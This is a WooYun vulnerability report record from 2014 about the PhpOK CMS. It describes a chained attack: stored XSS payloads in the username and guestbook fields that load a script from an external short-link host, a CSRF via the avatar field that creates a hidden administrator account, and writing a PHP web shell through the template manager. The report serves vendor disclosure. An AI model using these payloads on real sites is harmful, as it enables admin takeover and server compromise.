{"id": 50726, "wybug_id": "wooyun-2014-077024", "wybug_title": "Phpok漏洞礼包组合可shell", "wybug_corp": "phpok.com", "wybug_author": "JJ Fly", "wybug_date": "2014-09-23 12:01", "wybug_open_date": "2014-12-22 12:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述： Phpok漏洞礼包，组合可shell 详细说明：  1.2处存储行xss2.添加管理员帐号密码+利用点3.后台写shell1.第一处我们先来注册一个帐号。\n\n其中帐号这内容为a');document.write('<script/src=//t.cn/XXXXXXX></script>')//注册好之后。后台\n\n\n\n需要点击才能激活xss\n\n第二处留言\n\n留言主题a');document.write('<script/src=//t.cn/XXXXX></script>')//\n\n\n\n同样需要点击\n\n2.添加管理员帐号+利用点后台添加管理员帐号处，可以csrf。而且前台头像的地址没有进行效验。http://localhost/index.php?c=usercp&f=info单击修改资料 然后抓包Post的avatar值修改为admin.php%3Fc%3Dadmin%26f%3Dsave%26id%3D%26account%3Dwooyun%26pass%3Da123456%26email%3Da123456%26status%3D0%26if_system%3D1图中的值为url解码的内容\n\n然后再注册一个帐号上传头像 Post的avatar修改为admin.php%3Fc%3Dadmin%26f%3Dstatus%26id%3D2等管理员后台查看的时候会自动生成一个管理员而且状态为可用\n\n然后 可以在后台登录3.通过前两部可以进入后台然后 后台写shell后台  风格管理然后添加风格\n\n这个地方要注意。文件夹只能是系统存在的文件夹，要不会失败的。所以写系统默认存在的www文件夹就行。\n\n\n\n\n\n直接写shell/tpl/www/111.php代码如下\n\n   漏洞证明：  /tpl/www/111.php代码如下\n\n   修复方案：  \n你们更专业\n   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-23 12:15 厂商回复： 太牛了，哥给跪了~国庆后发布修正包 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}